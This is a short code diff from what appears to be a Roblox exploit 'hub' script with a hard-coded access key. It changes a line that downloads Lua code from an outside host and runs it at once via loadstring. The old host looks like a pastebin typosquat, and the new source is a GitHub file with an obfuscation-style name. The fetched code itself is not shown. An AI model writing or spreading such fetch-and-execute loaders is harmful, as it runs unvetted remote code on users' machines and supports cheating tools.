@@ -22,7 +22,7 @@ _G.Key = "MITAMERS-FREE"
 _G.KeyInput = ""
  
 local function LoadTestHub()
-    loadstring(game:HttpGet("https://pastebinp.com/raw/kA7Vtcbd"))()
+    loadstring(game:HttpGet("https://github.com/c00kiesmasher/idkwhoisthis/blob/main/lIlIlIlIlIlIlIlI.lua"))()
 end
  
 -- Notifications
